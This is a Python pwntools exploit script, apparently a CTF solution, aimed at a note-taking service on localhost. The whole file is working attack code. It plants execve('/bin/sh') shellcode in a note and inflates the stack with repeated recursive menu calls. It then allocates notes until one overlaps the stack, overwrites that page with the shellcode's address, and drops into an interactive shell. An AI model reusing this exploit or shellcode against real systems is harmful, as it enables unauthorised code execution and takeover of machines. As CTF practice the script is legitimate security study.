from pwn import *
import struct


PAGE_SIZE = 4096
ADDRESS_SIZE = 4
BIG_AMOUNT_OF_STACK_FRAME_THAT_NOT_CRASHES = 7500
MAX_NOTES_AMOUNT = 256

MAX_SURE_NOT_STACK_ADDR = 0xf0000000
MIN_POSSIBLE_STACK_ADDR = 0xff850000
MAX_POSSIBLE_STACK_ADDR = 0xffffe000

SHELLCODE = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"


def parse_note_creation(min_needed_addr, max_needed_addr, do_delete=False):
    r.recvuntil(b"5. exit\n")
    r.sendline(b"1")
    
    note_number_bytes = r.recvline()
    note_number = int(note_number_bytes.split()[-1])
    page_address_bytes = r.recvn(10)[2:]
    page_address = int(page_address_bytes, 16)

    if page_address < max_needed_addr and page_address > min_needed_addr:
        return note_number, page_address

    if do_delete:
        r.recvuntil(b"5. exit\n")
        r.sendline(b"4")
        r.recvuntil(b"no?\n")
        r.sendline(str(note_number).encode())
    
    return None, None


def write_to_note(note_number, note_input):
    r.recvuntil(b"5. exit\n")
    r.sendline(b"2")
    r.recvuntil(b"no?\n")
    r.sendline(str(note_number).encode())
    r.recvuntil(b"byte)\n")
    r.sendline(note_input)


def invalid_menu_option():
    r.recvuntil(b"5. exit\n")
    r.sendline(b"7")


def exit_menu():
    r.recvuntil(b"5. exit\n")
    r.sendline(b"5")



shellcode_note_num = None;
shellcode_page_addr = None
stack_overflow_note_num = None;

r = remote("localhost", 9019)

# Create a first note, that isn't in the stack region, and put the shellcode in it
while True:
    shellcode_note_num, shellcode_page_addr = parse_note_creation(0, MAX_SURE_NOT_STACK_ADDR, do_delete=True)
    if shellcode_note_num is not None:
        break

write_to_note(shellcode_note_num, SHELLCODE)
print("wrote to shellcode")

# increase the stack a lot by doing a lot of recursive calls with the "invalid menu" option
for i in range(BIG_AMOUNT_OF_STACK_FRAME_THAT_NOT_CRASHES):
    invalid_menu_option()
    if i % 100 == 0:
        print("iteration <{}>".format(i))    
print("increased stuck enough")

# create notes until there is a note that falls on the stack
notead_created = 1
while True:
    if notead_created < MAX_NOTES_AMOUNT:
        stack_overflow_note_num, stack_overflow_page = parse_note_creation(MIN_POSSIBLE_STACK_ADDR, MAX_POSSIBLE_STACK_ADDR)
    else:
        stack_overflow_note_num, stack_overflow_page = parse_note_creation(MIN_POSSIBLE_STACK_ADDR, MAX_POSSIBLE_STACK_ADDR, do_delete=True)
    notead_created += 1
    if stack_overflow_note_num is not None:
        break
print("found page to overflow: {}".format(str(stack_overflow_page)))

# write the address of the shellcode to the note which was allocated on the stack
# namely, writes the address of the shellcode somewhere on the supposed stack
overflow_input = (PAGE_SIZE // ADDRESS_SIZE) * struct.pack("<I", shellcode_page_addr)
write_to_note(stack_overflow_note_num, overflow_input)

# exit the menu, which will close all the recursion and will use the 
exit_menu()
r.interactive()
